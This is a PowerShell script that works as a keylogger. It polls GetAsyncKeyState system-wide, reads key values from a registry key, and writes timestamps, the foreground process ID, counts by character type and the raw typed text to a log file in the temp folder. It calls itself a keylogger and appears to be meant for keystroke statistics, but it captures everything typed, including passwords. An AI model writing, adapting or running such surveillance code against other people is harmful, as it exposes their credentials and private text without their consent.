## Def
# API declaration
$APIsignaturesWin32 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

$Win32 = Add-Type -MemberDefinition $APIsignaturesWin32 -Name 'Win32' -Namespace API -PassThru

$APIsignaturesUtils = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out int ProcessId);
'@

Add-Type $APIsignaturesUtils -Name Utils -Namespace Win32
$myPid = [IntPtr]::Zero;

## Sub Functions
function get-activewin()
{
  $hwnd = [Win32.Utils]::GetForegroundWindow()
  $null = [Win32.Utils]::GetWindowThreadProcessId($hwnd, [ref] $myPid)
  $activewin = Get-Process| Where-Object ID -eq $myPid | Select-Object *
  # return
  $activewin
}

function output-line($logPath, $ary_str, $cnt_alpha, $cnt_numeric, $cnt_symbol, $cnt_mouse, $cnt_other){
  $activewin = get-activewin
  $arylst = New-Object System.Collections.ArrayList
  $null = $arylst.Add((Get-Date).ToString($C_dateformat))
  $null = $arylst.Add($activewin.Id)
  $null = $arylst.Add($cnt_alpha)
  $null = $arylst.Add($cnt_numeric)
  $null = $arylst.Add($cnt_symbol)
  $null = $arylst.Add($cnt_other)
  $null = $arylst.Add($ary_str)
  $ary = $arylst.ToArray()
  $line = $ary -join "`t"
  
  Add-Content -Path $logPath -Value $line -Encoding $C_Encode
  if($C_debug_mode){
    # $logger.info.Invoke("logPath=$logPath")
    # $logger.info.Invoke("cnt=$cnt")
    # $logger.info.Invoke("ary_str=$ary_str")
    $logger.info.Invoke("line=$line")
  }
}

function convert-value($value){
  if($value.length -le 1){
    $rtn = $value
  }else{
    if($value.Startswith('Shift + ')){
      if($C_shift_key_dic.ContainsKey($value)){
        $rtn = $C_shift_key_dic[$value]
      }else{
        $rtn = $value.ToUpper().Substring($value.Length - 1, 1)
        ## FIXME When some chars inputting
        # $tmp_strs = str.Split(",")
        # $tmp_formatted = $tmp_strs | Foreach-Object {$_.ToUpper()} | Foreach-Object {$_.Trim()}
        # $rtn = $tmp_formatted -Join ''
      }
    }elseif($value -ieq 'space'){
      $rtn = ' '
    }else{
      $rtn = $value
    }
  }
  $logger.info.Invoke("value=$value, rtn=$rtn")
  ## return
  $rtn
}


## function
function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt") 
{
  # output file path
  if (Test-Path $logPath){
    $null
  }else{
    $null = New-Item -Path $logPath -ItemType File
    $line = "datetime`tprocessid`tcount`tkeystrokes"
    Add-content -Path $logPath  -Value "$line`r`n" -Encoding $C_Encode
  }
  # variables
  $cnt_alpha = 0
  $cnt_numeric = 0
  $cnt_symbol = 0
  $cnt_mouse = 0
  $cnt_other = 0
  $symbol_ary = $C_symbols -split ""
  # buf
  $arylst = New-Object System.Collections.ArrayList
  $buf = ''
  
  try
  {
    $logger.warn.Invoke('Keylogger started. Press CTRL+C to see results...')
    $logger.info.Invoke("Output keystroke log to ... $logPath")
    
    
    while ($true) {
      Start-Sleep -Milliseconds $C_waittime
      $starttime = Get-Date
      $flag = $true
      while ($flag) {
        for ($btKeyCode = 0; $btKeyCode -le 254; $btKeyCode++) {
          ## FIXME [ ] How can I get WheeelUp and WheelDown,etc.
          
          ## get key state
          $keystate = $Win32::GetAsyncKeyState($btKeyCode)
          
          ## if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock ##FIXME Why this line is written?
            $val_org = (Get-ItemProperty -path 'HKCU:\Software\GetKeypressValue').KeypressValue
            $val = convert-value $val_org
            if($val.length -le 1){
              $buf = $buf + $val
              if($val -match "[a-zA-Z]"){
                $cnt_alpha = $cnt_alpha + 1
              }elseif($val -match "[0-9]"){
                $cnt_numeric = $cnt_numeric + 1
              }elseif($symbol_ary.Contains($val)){
                $cnt_symbol = $cnt_symbol + 1
              }else{
                $cnt_other = $cnt_other + 1
              }
            }else{
              if($buf -ne ""){
                $null = $arylst.Add($buf)
              }
              if($C_exclusion_words -notcontains $val){
                if($val.length -ne 0){
                  $null = $arylst.Add($val)
                  $cnt_other = $cnt_other + 1
                }
              }
              $buf = ""
            }
          }
          $endtime = Get-Date
          $secondstosleep = [int]($C_interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      $ary = $arylst.ToArray()
      $ary_str = $ary -join ","
      # if($C_debug_mode){
      #   $logger.info.Invoke("logPath=$logPath")
      #   $logger.info.Invoke("cnt=$cnt")
      #   $logger.info.Invoke("ary_str=$ary_str")
      # }
      output-line $logPath $ary_str $cnt_alpha $cnt_numeric $cnt_symbol $cnt_mouse $cnt_other 
      $cnt_alpha = 0
      $cnt_numeric = 0
      $cnt_symbol = 0
      $cnt_mouse = 0
      $cnt_other = 0
      $buf = ''
      $arylst.Clear()
    }
  }
  finally
  { 
    $null = $arylst.Add($buf)
    $ary = $arylst.ToArray()
    $ary_str = $ary -join ","
    $cnt = $buf.length + $ary.length - 1
    output-line $logPath $ary_str $cnt
  }
}

## ---------------------------------------------------- // entry point
## include configs
$project_name = split-path $PWD.path -leaf
$config = "./$project_name.config.ps1"
. $config

## include logger
. ./Get-Logger.ps1

$logger = Get-Logger
$logger.info.Invoke("get config from $config")

Log-Keystrokes $C_output_path
